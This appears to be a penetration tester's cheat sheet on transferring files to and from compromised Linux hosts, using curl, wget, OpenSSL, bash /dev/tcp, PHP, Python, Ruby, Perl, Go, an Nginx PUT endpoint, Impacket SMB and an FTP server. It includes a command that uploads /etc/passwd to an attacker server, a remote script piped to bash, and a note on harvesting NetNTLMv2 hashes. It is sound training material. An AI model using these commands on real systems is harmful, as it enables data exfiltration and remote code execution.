# Linux File Transfer Methods

## Wget / cURL

Both of these commands support uploading and downloading 

```bash
# Upload
curl -T /etc/passwd http://<serverIP>/user.txt

# Download
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## OpenSSL

OpenSSL is frequently installed and is also often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style."

```bash
# Create certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

# Stand Up Server
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh

# Download File
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Bash (/dev/tcp)

There may also be situations where no obvious file transfer tools are available. In this case, as long as bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/tcp device file can be used for simple file downloads.

```Bash
# Connect to the Target WebServer
exec 3<>/dev/tcp/10.10.10.32/80

# HTTP GET Request
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3

# Print the Response
cat <&3
```

## PHP

PHP is also very prevalent and provides multiple file transfer methods.

```php
# File_get_contents()
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

# Fopen()
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Php-curl : If this module has been installed
php -r '$rfile = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"; $lfile = "LinEnum.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'

# It is also possible to retrieve each line as an array and pipe the output to bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

## Python

```python
# Python 2
python2
import urllib
urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")

# Python 3
python3
import urllib.Request
urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")
```

## Other Languages

### Ruby

```Ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'

```

### Perl

```perl
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

### Go

```Go
package main

import (
	 "os"
     "io"
     "net/http"
)

func main() {
     lfile, err := os.Create("LinEnum.sh")
     _ = err
     defer lfile.Close()

     rfile := "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
     response, err := http.Get(rfile)
     defer response.Body.Close()

     io.Copy(lfile, response.Body)
}

```


# Catching Files over HTTP/SMB

## Nginx Enable Put

```bash
# Create Upload Files Directory
sudo mkdir -p /var/www/uploads/uploaddirectory

# Change Owner to www-data
chown -R www-data /var/www/uploads/uploaddirectory

# Create Nginx Configuration File in /etc/nginx/sites-available/upload.conf
server {
	listen 9001;

    location /uploaddirectory/ {
		root    /var/www/uploads;
		dav_methods PUT;
	}
}

# Symlink the site to sites-enabled directory
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled

# Start the Nginx Service
sudo systemctl start nginx.service 

```
We can verify that the above command works

```bash
curl -T /etc/password http://localhost:9001/uploaddirectory/user.txt
tail -1 /var/www/upload/uploaddirectory/user.txt
```

# SMB Server

## Impacket SMBServer

Impacket is my preferred method of setting up a file transfer over SMB because it does not run in the background or involve modifying configuration files.  If other people attempt to connect to the service, it has the bonus that it will display a NetNTLMv2 hash that, if successfully cracked, will reveal the password.

```bash
# Impacket-SMBServer Syntax
impacket-smbserver -smb2support <share name> <share path>

# Create SMBServer in current working directory
sudo impacket-smbserver -smb2support FileTransfer $(pwd)

# Share with Username and Password for those that don't allow anonymous access
sudo impacket-smbserver -smb2support -user USERNAME -password PASSWORD FileTransfer $(pwd)

# Verify Share
sudo smbclient -L 127.0.0.1
```

## Python 3 FTP Server

```bash
# Install pyftpdlib
pip3 install pyftpdlib

# Python3 FTP Server
python3 -m pyftpdlib --user=pentester --password=p4ssw0rd -w
```